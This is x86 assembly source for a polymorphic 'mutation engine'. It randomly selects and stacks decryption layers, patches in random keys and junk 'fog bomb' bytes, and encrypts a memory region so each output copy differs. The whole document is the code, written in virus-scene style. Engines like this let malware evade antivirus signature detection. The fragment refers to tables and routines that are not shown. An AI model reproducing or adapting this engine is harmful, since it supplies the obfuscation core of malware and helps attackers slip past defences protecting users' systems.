;SlowMutation Engine 0.1á2 (c) random
;Usage: 
; esi = memory to encrypt
; ecx = size of the memory (how much 2 encrypt/decrypt)
; edi = buffer to fill in the decryption layers

RSlowMteInc_Start:

SlowMte_Start:
 mov dword ptr [Mem2Encrypt],esi    
 mov dword ptr [MemSize],ecx
 mov dword ptr [LayerPos],edi

 mov esi,offset Predefined_Decryption_Layers        ; pointer to the encryption layers
 mov ecx,(offset Predefined_Decryption_Layers_End - offset Predefined_Decryption_Layers)
 mov edi,dword ptr [LayerBuffer]                    ; pointer to the reserved memory
 rep movsb                                          ; copy all layers

 movzx ecx,byte ptr [HowMuchLayers]                 ; get the number of needed layers
 xor edx,edx                                        ; edx = layercounter = 0
Generate_Layer:
 push ecx
 push edx
 movzx edi,byte ptr [NumberOfLayers]                ; maximal number of layers
 call GenRandomValue                                ; generate a random value
 pop edx

 mov byte ptr [Choosed_Layers+edx],al               ; write the choosed layer

 mov edi,dword ptr [LayerSizes]                     ; get all sizes of all layers
 add edi,offset LayerTable
 mov esi,dword ptr [Decryption_Layer_Table+(eax*4)] ; pointer to the layer
 add esi,dword ptr [LayerBuffer]                    ; add the memory offset

 movzx ecx,word ptr [Decryption_Layer_Size+(eax*2)] ; get the layer size
 add dword ptr [LayerSizes],ecx                     ; add the size 
 rep movsb                                          ; copy the layer in the new buffer

 pop ecx
 inc edx                                            ; increase the layer counter
 dec ecx
 jnz Generate_Layer

 push esi
 mov esi,offset Layer_Table_End
 sub esi,edi
 add dword ptr [MemSize],esi                        ; add it to the memsize
 pop esi

 mov dword ptr [SavedPOS],edi                       ; save the pos of the last layer
 movzx ecx,byte ptr [HowMuchLayers]                 ; how many layers 2 encrypt?
 mov dword ptr [LayerSizes],0                       ; zero layersizes
 dec edx                                            ; decrease the layer pointer
EncryptMemory:
 pushad
 movzx eax,byte ptr [Choosed_Layers+edx]            ; get the choosed layer
 mov ecx,dword ptr [LayerSizes]                     ; get the size of all layers

 mov esi,dword ptr [SavedPOS]                       ; get the position of the last layer

 movzx ebx,word ptr [Decryption_Layer_Size+(eax*2)] ; get the size of the current
 add dword ptr [LayerSizes],ebx                     ; add the current size to the layersizes
 add ecx,dword ptr [MemSize]                        ; add the size of the mem
        
 sub dword ptr [SavedPOS],ebx                       ; calculate the new last pos

 push esi
 mov esi,dword ptr [SavedPOS]
 add esi,dword ptr [Size_Patches+(eax*4)]
 cmp byte ptr [BitBreite+eax],1
 jnz BitBreite8
 shr ecx,1
BitBreite8:
 cmp byte ptr [BitBreite+eax],2
 jnz BitBreite8_2
 shr ecx,2
BitBreite8_2:
 mov [esi+1],ecx
 pop esi

 cmp dword ptr [NebelBomben+(eax*4)],0
 jz NoNebelBombe

 push esi
 mov esi,dword ptr [SavedPOS]
 add esi,dword ptr [NebelBomben+(eax*4)]
 push eax
 Call Randomize
 mov byte ptr [esi+2],al
 pop eax
 pop esi
NoNebelBombe:

 push esi
 mov esi,dword ptr [SavedPOS]
 cmp dword ptr [RandomValues+(eax*4)],0
 jz NoRandomValue
 add esi,dword ptr [RandomValues+(eax*4)]
 push eax
 Call Randomize
 mov [esi+1],eax
 mov edx,eax
 pop eax
NoRandomValue:
 pop esi

 call dword ptr [(eax*4)+offset Encryption_Layer_Table] ; call the encryption routine for this layer

 popad
 dec edx
 dec ecx
 jnz EncryptMemory

 jmp EncryptionFinished

;Generates a random value
;edi = maximal value allowed
;
GenRandomValue proc
GenerateAgain:
 Call Randomize
 xchg ecx,eax
 Call Randomize
 xor ecx,eax
 Call Randomize
 xor eax,ecx

; mov ecx,eax
; and ecx,0FFFFh
 mov ecx,255
 xor edx,edx
GenValues:
 xor eax,ecx
 rol edx,cl
 inc edx
 dec ecx
 jnz GenValues
 xor eax,edx
 xor edx,edx
 div edi
 mov eax,edx
 or eax,eax
 jz GenerateAgain
 ret
GenRandomValue endp

RSlowMteInc_End:
SlowMte_End:
